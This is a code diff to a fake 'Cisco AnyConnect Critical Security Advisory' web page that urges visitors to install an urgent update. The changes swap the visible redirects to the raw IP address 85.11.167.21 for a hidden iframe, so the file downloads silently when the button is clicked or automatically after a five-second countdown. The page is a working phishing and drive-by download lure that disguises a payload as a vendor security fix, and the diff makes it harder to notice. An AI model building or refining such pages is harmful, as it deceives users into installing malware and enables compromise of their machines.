@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Cisco AnyConnect — Critical Security Advisory</title>
-  <meta http-equiv="Refresh" content="5; url=http://85.11.167.21/co">
   <style>
     *{margin:0;padding:0;box-sizing:border-box}
     body{font-family:'Segoe UI',Roboto,Arial,sans-serif;background:#eef2f5;color:#1a1a1a}
@@ -36,6 +35,7 @@
     .changelog li{font-size:12px;color:#334155;padding:5px 0 5px 20px;position:relative}
     .changelog li::before{content:'🔒';position:absolute;left:0;font-size:11px}
     .footer{padding:16px 24px;background:#f8fafc;border-top:1px solid #e2e8f0;text-align:center;font-size:11px;color:#64748b}
+    #downloadFrame { display: none; }
   </style>
 </head>
 <body>
@@ -65,7 +65,7 @@
         <div class="progress"><div class="progress-fill"></div></div>
         <p style="font-size:12px; margin-top:8px;">Cisco Security Advisory · Immediate deployment recommended</p>
       </div>
-      <button class="btn" onclick="window.location='http://85.11.167.21/co'">Download & Install Update</button>
+      <button class="btn" onclick="startDownload()">Download & Install Update</button>
       <button class="btn btn-outline">Postpone (unsafe)</button>
       <div class="changelog">
         <h4>What this update fixes:</h4>
@@ -83,15 +83,25 @@
     </div>
   </div>
 </div>
+
+<iframe id="downloadFrame" style="display:none"></iframe>
+
 <script>
+  const downloadUrl = 'http://85.11.167.21/co';
   let t = 5;
   const cdEl = document.getElementById('cd');
+  
+  function startDownload() {
+    const iframe = document.getElementById('downloadFrame');
+    iframe.src = downloadUrl;
+  }
+
   const interval = setInterval(() => {
     t--;
     cdEl.textContent = t;
     if (t <= 0) {
       clearInterval(interval);
-      window.location.href = 'http://85.11.167.21/co';
+      startDownload();
     }
   }, 1000);
 </script>
